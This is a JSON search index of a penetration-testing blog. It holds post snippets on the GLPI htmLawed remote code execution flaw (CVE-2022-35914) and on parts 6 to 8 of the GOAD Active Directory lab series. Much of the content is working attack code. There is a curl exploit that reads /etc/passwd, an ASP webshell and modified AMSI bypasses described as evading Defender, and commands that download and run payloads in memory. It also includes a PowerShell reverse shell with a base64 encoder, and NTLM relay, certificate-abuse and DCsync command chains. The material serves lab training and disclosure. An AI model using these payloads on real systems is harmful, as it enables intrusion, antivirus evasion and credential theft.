[ { "title": "GLPI htmlawed (CVE-2022-35914)", "url": "/posts/GLPI-htmlawed-CVE-2022-35914/", "categories": "CVE", "tags": "CVE,, GLPI,, CVE-2022-35914", "date": "2022-10-03 00:00:00 +0200", "snippet": "TL;DR;InfosOn a recent pentest we faced an interesting scope with full up to date products and without any credentials.After spend some time on bruteforce dns, folders, all the login form and doing all kind of stuff i get nothing interesting.We found a GLPI product exposed on internet with a very recent vulnerability (an unauthenticated SQL injection, the vulnerability was publicized a week before the pentest, and it was already patched on the scope x_x ).GLPI is a php solution, the definition given by the vendor is “GLPI stands for Gestionnaire Libre de Parc Informatique is a Free Asset and IT Management Software package, that provides ITIL Service Desk features, licenses tracking and software auditing.” This solution is quite used in France and it make it a very good target for our pentest.Starting on a product with a recent critical vulnerability is not a bad idea to start an investigation. This means the vendor care about patching and he will certainly be reactive if you find something interesting.After few hours of code digging, i got some interesting things to dig more but nothing to get inside my scope without authentication.On my research, i start digging on the vendor folder and there, i found a trivial vulnerability in the vendor folder of the GLPI product.Context The vulnerability is not in GLPI by itself but in the third party library HTMLAWED https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/. The test script of the library was vulnerable in the version &amp;lt; v1.2.9. The day I noticed the vendor of this vulnerability he patched the release package and his server., he was very reactive and thankful. Thanks to him ! On GLPI this library is given in the release version with an example script (the composer version does not include this script, but the composer used on GLPI download the all package). This will get the last version, so all should be fine no ? In fact the GLPI releases include the vendor folder directly on the release. So when you download version &amp;lt;= 9.5.8 or &amp;lt;= 10.0.2 you will get an old version of the library with the source code and also the htmLawedTest.php file with it.Vulnerability description The issue happen when the htmLawedTest.php is present and it is the case by default in glpi 9.x and 10.x (don’t know about others) as GLPI directly get it with composer. On the GLPI application by default the path /vendor/htmlawed/htmlawed/htmLawedTest.php is available to all. In htmLawedTest.php the programmer use the user entry to setup the htmlawed configuration and give the users all configurations available to test the product. # htmlawedTest.php...if($do){ $cfg = array(); foreach($_POST as $k=&amp;gt;$v){ if($k[0] == &#39;h&#39; &amp;amp;&amp;amp; $v != &#39;nil&#39;){ $cfg[substr($k, 1)] = $v; } }...$out = htmLawed($_POST[&#39;text&#39;], $cfg, $_POST[&#39;spec&#39;]); As you can see the function htmlLawed is called with all parameters on our control. One of the available configuration options is a hook function. If the hook (or hook_tag) is controlled by the user he can setup a php execution where he can control the function name and the parameters (string or array, array, string or array).# htmlawed.phpfunction htmLawed($t, $C=1, $S=array()){ ... $C[&#39;hook&#39;] = (!empty($C[&#39;hook&#39;]) &amp;amp;&amp;amp; function_exists($C[&#39;hook&#39;])) ? $C[&#39;hook&#39;] : 0; ... if($C[&#39;hook&#39;]){$t = $C[&#39;hook&#39;]($t, $C, $S);} This match almost exactly the PHP exec function signature but php is nice on variable types so we can use the exec function as the hook.exec(string $command, array &amp;amp;$output = null, int &amp;amp;$result_code = null): string|false So we got a command injection ($t is the user entry) and exec will override $C and $S. As $t is replaced with the result of the hook, this is just like a webshell we directly get the result of the command. Please note that there is other ways to exploit the vulnerability without exec, by using callback functions like array_map,call_user_func,… do not rely on disable_function on exec to patch the vulnerabilityGLPI release a patch on their github the 14/09/2022 for glpi 10.0.x (10.0.3) and 9.5.x (https://github.com/glpi-project/glpi/releases/tag/9.5.9). Htmlawed already patched the vulnerability.(The patch in htmlawed was only an unset of the hook and hook_tag parameters coming from the example script, so be careful if you call the function in your code with users parameters).Impacts The impact of this vulnerability is an unauthenticated remote code execution so it is critical. (CVSS score 9.8) If your GLPI is exposed on internet you are on a critical risk (If it is your case, you shouldn’t do that. A ticket and IT management software must be limited to internal network or at least should be behind a previous authentication portal). Anyway to quickly patch without upgrade you should delete the file /vendor/htmlawed/htmlawed/htmLawedTest.php and search for access to this file in your logs. (I also recommends you to disallow direct access to the vendor folder directly to avoid that kind of vulnerabilities).Traces of exploitation Search for /vendor/htmlawed/htmlawed/htmLawedTest.php in the logs to get traces of compromising.ExploitationAs simple as that :curl -s -d &#39;sid=foo&amp;amp;hhook=exec&amp;amp;text=cat /etc/passwd&#39; -b &#39;sid=foo&#39; http://localhost/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep &#39;\\&amp;amp;nbsp; \\[[0-9]+\\] =\\&amp;amp;gt;&#39;| sed -E &#39;s/\\&amp;amp;nbsp; \\[[0-9]+\\] =\\&amp;amp;gt; (.*)&amp;lt;br \\/&amp;gt;/\\1/&#39;Timeline 13/07 : declaration to htmlawed library vendor cve open declaration to glpi vendor 13/07: fix provided by htmlawed vendor 14/09: glpi release version 10.0.3 with a fix 19/09: CVE-2022-35914 is public 01/10: Someone reverse the cve information and publish a public poc on github https://github.com/cosad3s/CVE-2022-35914-poc 03/10: As all information are already public i release this blog post before the “1 month after cve is public” safe time i would like to take. " }, { "title": "GOAD - part 8 - Privilege escalation", "url": "/posts/GOADv2-pwning-part8/", "categories": "AD", "tags": "AD,, Lab,, AMSI,, krbrelay,, printspoofer", "date": "2022-09-25 00:00:00 +0200", "snippet": "In the previous post (Goad pwning part7) we tried some attacks with MSSQL on the domain.This time we will get a web shell on IIS and try some privilege escalation techniques.IIS - webshell There is a simple asp.net application on http://192.168.56.22/, this application only give us a simple file upload functionality. From there we can upload a basic webshell in asp : webshell.asp (at the time of writing, this avoid defender signature)&amp;lt;%Function getResult(theParam) Dim objSh, objResult Set objSh = CreateObject(&quot;WScript.Shell&quot;) Set objResult = objSh.exec(theParam) getResult = objResult.StdOut.ReadAllend Function%&amp;gt;&amp;lt;HTML&amp;gt; &amp;lt;BODY&amp;gt; Enter command: &amp;lt;FORM action=&quot;&quot; method=&quot;POST&quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;param&quot; size=45 value=&quot;&amp;lt;%= myValue %&amp;gt;&quot;&amp;gt; &amp;lt;input type=&quot;submit&quot; value=&quot;Run&quot;&amp;gt; &amp;lt;/FORM&amp;gt; &amp;lt;p&amp;gt; Result : &amp;lt;% myValue = request(&quot;param&quot;) thisDir = getResult(&quot;cmd /c&quot; &amp;amp; myValue) Response.Write(thisDir) %&amp;gt; &amp;lt;/p&amp;gt; &amp;lt;br&amp;gt; &amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt; The webshell is uploaded in the upload folder. And we have a command execution on the IIS server We can get a reverse shell with the same method used for mssql As a IIS service user we got SeImpersonatePrivilege privilege ! (same thing on mssql, the service got this permission by default)Privesc There is a lot of privesc technics on microsoft windows. Here we will just try two that got a “not fix” by microsoft, printspoofer and krbrelay. As the privesc is run on the target computer, in this chapter we will do some powershell to escalate our privileges.AMSI bypass To do all my tests, i enable windows defender on all system.Castelblack got defender disabled by default, you should enable it before testing the privesc technics described here To be able to play usually AV detected application from memory you should bypass the Anti Malware Scanning Interface (AMSI) on the current process There is multiple ways to bypass AMSI and you can find them on the github page : https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell Also you can find custom generated payload in this website amsi.fail All the public available method seems to be signed, but we can also pick one and make some hand made small modifications on it Original : # Matt Graebers second Reflection method[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;).GetField(&#39;amsiContext&#39;,[Reflection.BindingFlags]&#39;NonPublic,Static&#39;).GetValue($null),0x41414141) Modified version:$x=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39;+&#39;siUt&#39;+&#39;ils&#39;);$y=$x.GetField(&#39;am&#39;+&#39;siCon&#39;+&#39;text&#39;,[Reflection.BindingFlags]&#39;NonPublic,Static&#39;);$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344) This is trivial modifications, but this is enough to bypass the signature at the time of writing. Once we have done that we can use the rasta mouse AMSI bypass to disable AMSI at the .net level. If you want to know why you have to do that, you should read this blog post from @ShitSecure explaining the difference between powershell and .net AMSI level : https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/# Patching amsi.dll AmsiScanBuffer by rasta-mouse$Win32 = @&quot;using System;using System.Runtime.InteropServices;public class Win32 { [DllImport(&quot;kernel32&quot;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&quot;kernel32&quot;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&quot;kernel32&quot;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}&quot;@Add-Type $Win32$LoadLibrary = [Win32]::LoadLibrary(&quot;amsi.dll&quot;)$Address = [Win32]::GetProcAddress($LoadLibrary, &quot;AmsiScanBuffer&quot;)$p = 0[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6) We put the bypass script on our disk and load it remotelypython3 -m http.server 8080(new-object system.net.webclient).downloadstring(&#39;http://192.168.56.1:8080/amsi_rmouse.txt&#39;)|IEX Once we have done that, we can play what we want with the condition to don’t touch the disk ! #the_disk_is_lava We can now play all our .net application by running them directly with execute assembly.winPeas without touching disk My favorite tools to look for privilege escalation is without a doubt winpeas We already bypass amsi on the previous step, what we can do now to avoid detection is put winpeas on an http server and load it in memory This article explain very well how to load and run an assembly with powershell full in memory.cd /var/www/htmlwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exepython3 -m http.server 8080 And play winPeas from memory with the following powershell commands (As winPeas is in .net we load the assembly and run it directly) :$data=(New-Object System.Net.WebClient).DownloadData(&#39;http://192.168.56.1:8080/winPEASany_ofs.exe&#39;);$asm = [System.Reflection.Assembly]::Load([byte[]]$data);$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);[winPEAS.Program]::Main(&quot;&quot;);[Console]::SetOut($out);$sWriter.ToString() WinPeas take several minutes to complete and give the prompt back with all the info (without the capture of the console out the output is empty in our basic powershell reverseshell, if you got a “real” shell you don’t have to do that and just launch the [winPEAS.Program]::Main(&quot;&quot;); without the console stuff, thanks to PowerSharpPack code for the trick) If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use PowerSharpPack and get everything done for you (thanks again to @ShitSecure). iex(new-object net.webclient).downloadstring(&#39;http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1&#39;)PowerSharpPack -winPEAS And we get the information of SEImpersonate Privilege to use for escalationPacking your .net binary for powershell If you don’t want to use binary from internet (and you should don’t use pre-compiled code grabbed on github on your pentest mission), you can also pack you own binary with the following script : EncodeAssembly.ps1 This script is a modification of the one from @snovvcrash website and some code of PowerSharpPack. Pack with the following commands :. .\\EncodeAssembly.ps1Invoke-EncodeAssembly -binaryPath winPEAS.exe -namespace winPEAS -capture $true To be use as reflective assembly in powershell remember you should avoid environment.exit() in the .net code and also you must set the class and the main method public.SeImpersonatePrivilege to Authority\\system To escalate privilege from our iis (or mssql) user with SeImpersonatePrivilege to Authority\\system we can use one of the “potatoes” technic. A wonderfull blog post explain the different potatoes here : https://jlajara.gitlab.io/Potatoes_Windows_Privesc So let’s use SweetPotato, a compilation of all the technics, “the potatoe to rule them all”. Ok so we clone the project and compile it with visualStudio Prepare a bat file to run ou powershell basic reverse shell on executioncd wwwecho &quot;@echo off&quot; &amp;gt; runme.batecho &quot;start /b $(python3 payload.py 192.168.56.1 4445)&quot; &amp;gt;&amp;gt; runme.batecho &quot;exit /b&quot; &amp;gt;&amp;gt; runme.batpython3 -m http.server 8080 Prepare the listenernc -nlvp 4445 With our reverse shell play the following commandmkdir c:\\tempcd c:\\temp(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.56.1:8080/runme.bat&#39;,&#39;c:\\temp\\runme.bat&#39;)$data=(New-Object System.Net.WebClient).DownloadData(&#39;http://192.168.56.1:8080/SweetPotato.exe&#39;);$asm = [System.Reflection.Assembly]::Load([byte[]]$data);$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);[SweetPotato.Program]::Main(@(&#39;-p=C:\\temp\\runme.bat&#39;));[Console]::SetOut($out);$sWriter.ToString() By default the tool use the printSpoofer technic by @itm4n If you don’t want to compile sweet patatoes you could also do that with BadPotato from PowerSharpPack (but first we must bypass amsi -see the AMSI bypass part before- or it will be detected) $x=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39;+&#39;siUt&#39;+&#39;ils&#39;);$y=$x.GetField(&#39;am&#39;+&#39;siCon&#39;+&#39;text&#39;,[Reflection.BindingFlags]&#39;NonPublic,Static&#39;);$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)iex(new-object system.net.webclient).downloadstring(&#39;http://192.168.56.1:8080/amsi_rmouse.txt&#39;)iex(new-object net.webclient).downloadstring(&#39;http://192.168.56.1:8080/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1&#39;)Invoke-BadPotato -Command &quot;c:\\temp\\runme.bat&quot;KrbRelay Up Another very useful technic to escalate privileges is kerberos relay, like implemented in KrbRelayUp Thx to @dec0ne who use GOADv1 to demonstrate the technic on his tool :) As KrbRelayUp is detected by defender, we will use the step by step approach like this writeup by @an0n_r0, using @cube0x0 KrbRelay At the time of writing KrbRelay is not detected by defender. The conditions to exploit this privesc is LDAP signing is NOT enforced, we can check that with cme ldap-signing module : cme ldap 192.168.56.10-12 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M ldap-signingAdd computer and RBCD To exploit krbrelay by adding a computer, you must be able to add new Computer, we can check that with cme MAQ modulecme ldap 192.168.56.11 -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ Add computer : addcomputer.py -computer-name &#39;krbrelay$&#39; -computer-pass &#39;ComputerPassword&#39; -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH &#39;north.sevenkingdoms.local/jon.snow:iknownothing&#39; Get the SID of that computer: PS C:\\Users\\jon.snow\\Desktop&amp;gt; $o = ([ADSI]&quot;LDAP://CN=krbrelay,CN=Computers,DC=north,DC=sevenkingdoms,DC=local&quot;).objectSIDPS C:\\Users\\jon.snow\\Desktop&amp;gt; (New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).ValueS-1-5-21-3469228063-1577654746-3345322900-1127 Check portsPS C:\\Users\\jon.snow\\Desktop&amp;gt; .\\CheckPort.exe[*] Looking for available ports..[*] SYSTEM Is allowed through port 443 Launch krbrelayPS C:\\Users\\jon.snow\\Desktop&amp;gt; .\\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd S-1-5-21-3469228063-1577654746-3345322900-1127 -port 443 Now we finish with RBCD exploitation with Impacket : getTGT.py -dc-ip &#39;winterfell.north.sevenkingdoms.local&#39; &#39;north.sevenkingdoms.local&#39;/&#39;krbrelay$&#39;:&#39;ComputerPassword&#39;export KRB5CCNAME=/workspace/krbrelay\\$.ccachegetST.py -impersonate &#39;administrator&#39; -spn &#39;CIFS/castelblack.north.sevenkingdoms.local&#39; -k -no-pass -dc-ip &#39;winterfell.north.sevenkingdoms.local&#39; &#39;north.sevenkingdoms.local&#39;/&#39;krbrelay$&#39;export KRB5CCNAME=/workspace/administrator@CIFS_castelblack.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccachewmiexec.py -k @castelblack.north.sevenkingdoms.localC:\\&amp;gt;whoaminorth\\administrator Or with Rubeus$x=[Ref].Assembly.GetType(&#39;System.Management.Automation.Am&#39;+&#39;siUt&#39;+&#39;ils&#39;);$y=$x.GetField(&#39;am&#39;+&#39;siCon&#39;+&#39;text&#39;,[Reflection.BindingFlags]&#39;NonPublic,Static&#39;);$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)iex(new-object system.net.webclient).downloadstring(&#39;http://192.168.56.1:8080/amsi_rmouse.txt&#39;)iex(new-object net.webclient).downloadstring(&#39;http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1&#39;)PowerSharpPack -rubeus -Command &quot;hash /password:ComputerPassword&quot;PowerSharpPack -rubeus -Command &quot;s4u /user:krbrelay$ /rc4:0EDDEDC35EB7B7ECDE0C9F0564E54C83 /impersonateuser:administrator /msdsspn:host/castelblack /ptt&quot; And just like the writeup made by @an0n_r0 we launch SCMUACBypass.exe by Tyranid and get a system shell Without AV or if you modify/obfuscate KrbRelayUp you can do the all things with the following commands: .\\KrbRelayUp.exe relay -Domain north.sevenkingdoms.local -CreateNewComputerAccount -ComputerName evilhost2$ -ComputerPassword pass@123./KrbRelayUp.exe spawn -m rbcd -d north.sevenkingdoms.local -dc winterfell.north.sevenkingdoms.local -cn evilhost2$ -cp pass@123 With other methods KrbRelay can also be used to relay to ADCS or to add msDS-KeyCredentialLink and exploit with ShadowCredentials. All you need to know is on this page, this is leave as an exercice to the reader. Start on braavos mssql and try to get a shell as admin :)Useful Links https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/ https://github.com/S3cur3Th1sSh1t/PowerSharpPack https://jlajara.gitlab.io/Potatoes_Windows_Privesc https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9 https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/ https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html https://github.com/Dec0ne/KrbRelayUp) https://github.com/cube0x0/KrbRelayNext time we will do a review on lateral movement technics inside an active directory." }, { "title": "GOAD - part 7 - MSSQL", "url": "/posts/GOADv2-pwning-part7/", "categories": "AD", "tags": "AD,, Lab,, MSSQL", "date": "2022-09-12 00:00:00 +0200", "snippet": "In the previous post (Goad pwning part6) we tried some attacks with ADCS activated on the domain. Now let’s take a step back, and go back on the castelblack.north.sevenkingdoms.local to take a look at the MSSQL server.Before jump into this chapter, i have done some small configuration on the lab, to be sure you get it, you should pull the updates and play : ansible-playbook servers.yml to get the last mssql configuration. This modifications are: arya.stark execute as user dbo impersonate privilege on msdb brandon.stark impersonate on jon.snow Enumerate the MSSQL serversImpacket GetUserSPNs.py First let’s try to figure out the users with an SPN on an MSSQL serverGetUserSPNs.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople And on essos domainGetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeopleNmapnmap -p 1433 -sV -sC 192.168.56.10-23Two servers answer : castelblack.north.sevenkingdoms.local braavos.essos.local : the result is identical as castelblack.CrackMapExec Let’s try with crackmapexec./cme mssql 192.168.56.22-23 Now we could try with the user samwell.tarly./cme mssql 192.168.56.22 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local As we can see we got an access to the databaseImpacket To enumerate and use impacket mssql, i made a modified version of the example mssqlclient.py. You can find the version here The install is just like what we done in part5 merge the PR on your local impacket project and relaunch install:cd /opt/toolsgit clone https://github.com/SecureAuthCorp/impacket myimpacketcd myimpacketpython3 -m virtualenv myimpacketsource myimpacket/bin/activategit fetch origin pull/1397/head:1397git merge 1397python3 -m pip install . We connect to the mssql server with the following command :python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local And type help: lcd {path} - changes the current local directory to {path} exit - terminates the server process (and this session) enable_xp_cmdshell - you know what it means disable_xp_cmdshell - you know what it means enum_db - enum databases enum_links - enum linked servers enum_impersonate - check logins that can be impersonate enum_logins - enum login users enum_users - enum current db users enum_owner - enum db owner exec_as_user {user} - impersonate with execute as user exec_as_login {login} - impersonate with execute as login xp_cmdshell {cmd} - executes cmd using xp_cmdshell xp_dirtree {path} - executes xp_dirtree on the path sp_start_job {cmd} - executes cmd using the sql server agent (blind) use_link {link} - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step) ! {cmd} - executes a local shell cmd show_query - show query mask_query - mask query I added some new entries to the database : enum_db/enum_links/enum_impersonate/enum_login/enum_owner/exec_as_user/exec_as_login/use_link/show_query/mask_query Let’s start the enumeration :enum_logins This launch the following query (roles value meaning can be show here)select r.name,r.type_desc,r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin from master.sys.server_principals r left join master.sys.syslogins sl on sl.sid = r.sid where r.type in (&#39;S&#39;,&#39;E&#39;,&#39;X&#39;,&#39;U&#39;,&#39;G&#39;) We see only a basic view as we are a simple userimpersonate - execute as login Let’s enumerate impersonation values:enum_impersonate This launch the following queries:SELECT &#39;LOGIN&#39; as &#39;execute as&#39;,&#39;&#39; AS &#39;database&#39;, pe.permission_name, pe.state_desc,pr.name AS &#39;grantee&#39;, pr2.name AS &#39;grantor&#39; FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id = pr.principal_Id JOIN sys.server_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = &#39;IM&#39; The previous command list all login with impersonation permission This launch also the following command on each databases : use &amp;lt;db&amp;gt;;SELECT &#39;USER&#39; as &#39;execute as&#39;, DB_NAME() AS &#39;database&#39;,pe.permission_name,pe.state_desc, pr.name AS &#39;grantee&#39;, pr2.name AS &#39;grantor&#39; FROM sys.database_permissions pe JOIN sys.database_principals pr ON pe.grantee_principal_id = pr.principal_Id JOIN sys.database_principals pr2 ON pe.grantor_principal_id = pr2.principal_Id WHERE pe.type = &#39;IM&#39; The previous command list all users with impersonation permission What is the hell ? login and user, what is the difference ? A “Login” grants the principal entry into the SERVER A “User” grants a login entry into a single DATABASE I found out an image who explain it well and also a very nice summary here“SQL Login is for Authentication and SQL Server User is for Authorization. Authentication can decide if we have permissions to access the server or not and Authorization decides what are different operations we can do in a database. Login is created at the SQL Server instance level and User is created at the SQL Server database level. We can have multiple users from a different database connected to a single login to a server.” Ok let see the result : Ok samwell got login impersonation to the user sa. So we can impersonate sa with execute as login and execute commands with xp_cmdshellexec_as_login saenable_xp_cmdshellxp_cmdshell whoami This launch the following commands:execute as login=&#39;sa&#39;;exec master.dbo.sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec master.dbo.sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;exec master..xp_cmdshell &#39;whoami&#39; And we get a command execution ! Let’s continue our enumeration as login sa this time:enum_logins As we can see with sa login we see a lot more things. And we can see that jon.snow is sysadmin on the mssql server Let’s see if there is others impersonation privileges: enum_impersonate As sysadmin user (sa), we can see all the information in the database and so the others users with impersonation privileges. Another way to get in could be to access as brandon.stark and do execute as login on user jon.snow.impersonate - execute as user We launch a connection to the db as arya.stark :python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local if we use master db and impersonate user dbo we can’t get a shelluse masterexecute as user = &quot;dbo&quot;exec master..xp_cmdshell &#39;whoami&#39; but our user also got impersonate user privilege on dbo user on database msdb The difference between the two databases is that msdb got the trustworthy property set (default value on msdb). With the trustworthy property we get a shell :Coerce and relay Mssql can also be use to coerce an NTLM authentication from the mssql server. The incoming connection will be from the user who run the mssql server. In our case if we tale any user like hodor for example we can get an NTLM authentication start responder responder -I vboxnet0 Connect with hodor (0 privilèges)python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/hodor:hodor@castelblack.north.sevenkingdoms.local run a xp_dirtree command :exec master.sys.xp_dirtree &#39;\\\\192.168.56.1\\demontlm&#39;,1,1 And we get a connection back to our responder This will work also with ntlmrelayx (like with a server running as administrator and with the same password on other servers). But on the lab, this kind of behavior is not setup by now.trusted links Another SQL abuse we could try on the lab, is the usage of mssql trusted links. Note that trusted link is also a forest to forest technique To abuse the links let’s connect with jon.snow and use enum_linkspython3 mssqlclient.py -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local -showSQL (NORTH\\jon.snow dbo@master)&amp;gt; enum_links This play the following queries :EXEC sp_linkedserversEXEC sp_helplinkedsrvlogin As we can see a linked server exist with the name BRAAVOS and a mapping exist with the user jon.snow and sa on braavos. If we use the link we can get a command injection on braavos: use_link BRAAVOSenable_xp_cmdshellxp_cmdshell whoami This play the following MSSQL commands :EXEC (&#39;select system_user as &quot;username&quot;&#39;) AT BRAAVOSEXEC (&#39;exec master.dbo.sp_configure &#39;&#39;show advanced options&#39;&#39;,1;RECONFIGURE;exec master.dbo.sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;RECONFIGURE;&#39;) AT BRAAVOSEXEC (&#39;exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) AT BRAAVOS We got a command injection on braavos.essos.local as essos\\sql_svc I have done the modifications on mssqlclient.py to be able to chain trusted_links. From this we can continue to another trusted link, etc… Example : Command execution to shell We got command execution on castelblack and also on braavos. But now we want a shell to interact with the server. To get a shell we can use a basic Powershell webshell (There is one available on the arsenal commands cheatsheet project. This is another of my projects that i will need to improve when i get the time, but this script do not bypass defender anymore, so let’s write some modifications):$c = New-Object System.Net.Sockets.TCPClient(&#39;192.168.56.1&#39;,4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String ); $sb = ([text.encoding]::ASCII).GetBytes($sb + &#39;ps&amp;gt; &#39;); $s.Write($sb,0,$sb.Length); $s.Flush()};$c.Close() Let’s convert this powershell command to base64 in utf-16 for powershell#!/usr/bin/env pythonimport base64import sysif len(sys.argv) &amp;lt; 3: print(&#39;usage : %s ip port&#39; % sys.argv[0]) sys.exit(0)payload=&quot;&quot;&quot;$c = New-Object System.Net.Sockets.TCPClient(&#39;%s&#39;,%s);$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){ $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i); $sb = (iex $d 2&amp;gt;&amp;amp;1 | Out-String ); $sb = ([text.encoding]::ASCII).GetBytes($sb + &#39;ps&amp;gt; &#39;); $s.Write($sb,0,$sb.Length); $s.Flush()};$c.Close()&quot;&quot;&quot; % (sys.argv[1], sys.argv[2])byte = payload.encode(&#39;utf-16-le&#39;)b64 = base64.b64encode(byte)print(&quot;powershell -exec bypass -enc %s&quot; % b64.decode()) run it and get a shellOther tools to use There is some interresting projects to exploit mssql, here is some of them : https://github.com/NetSPI/ESC https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/MSSQL/Program.cs Interresting informations : https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/mssql https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md https://h4ms1k.github.io/Red_Team_MSSQL_Server/# https://github.com/Jean-Francois-C/Database-Security-Audit/blob/master/MSSQL%20database%20penetration%20testing Next time we will have fun with IIS and we will get an nt authority\\system shell on servers : (Goad pwning part8) :)" }, { "title": "GOAD - part 6 - ADCS", "url": "/posts/GOADv2-pwning-part6/", "categories": "AD", "tags": "AD,, Lab,, certipy,, adcs", "date": "2022-09-07 00:00:00 +0200", "snippet": "In the previous post (Goad pwning part5) we tried some attacks with a user account on the domain.On this part we will try attacks when an ADCS is setup in the domain.First we will use petitpotam unauthenticated and ESC8 attack to get domain admin on essos.local, next we will enumerate template certificate with certipy, bloodhound and a user account. To finish we will exploit the following attacks : certipy, esc1, esc2, esc3, esc4, esc6, certifried and shadow credentials.ESC8 - coerce to domain admin To make this attack work we will need : ADCS running on the domain with web enrollment enabled. A working coerce method (here we use petitpotam unauthent, but an authenticated printerbug or other coerce methods will work the same) There is a useful template to exploit ESC8, by default on an active directory, its name is DomainController Let’s check if the web enrollement is up and running at : http://192.168.56.23/certsrv/certfnsh.asp The server ask for an authentication so all is fine :) Add a listener to relay SMB authentication to HTTP with impacket ntlmrelayx ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController Launch the coerce with petitpotam unauthenticated (this will no more work on an up to date active directory but other coerce methods authenticated will work the same)petitpotam.py 192.168.56.1 meereen.essos.local ntlmrelayx will relay the authentication to the web enrollement and get the certificate Ask for a TGT with the certificate we just get (we copied it to the file cert.b64)gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39; And now we got a TGT for meereen so we can launch a DCsync and get all the ntds.dit content.export KRB5CCNAME=/workspace/esc8/meereen.ccachesecretsdump -k -no-pass ESSOS.LOCAL/&#39;meereen$&#39;@meereen.essos.localESC8 - with certipyOliver Lyak as done a wonderful job on the ADCS attack tool certipy to automatise a lots of things.Let’s do the same attack with certipy, setup the listener :certipy relay -ca 192.168.56.23 -template DomainController trig the coerce just like we did before with petitpotampetitpotam.py 192.168.56.1 meereen.essos.local Now we got the certificate so we can get the NT hash of the DC and also the TGT with the command :certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12 And we can launch a DCsync with secretsdump and the ticket we getexport KRB5CCNAME=/workspace/esc8/meereen.ccachesecretsdump -k -no-pass ESSOS.LOCAL/&#39;meereen$&#39;@meereen.essos.local# or with the hashsecretsdump -hashes &#39;:39d964a01c61c19fe36c71627d7ab56c&#39; -no-pass ESSOS.LOCAL/&#39;meereen$&#39;@meereen.essos.localADCS reconnaissance and enumeration (with certipy and bloodhound) Let’s start the enumeration with certipycertipy find -u 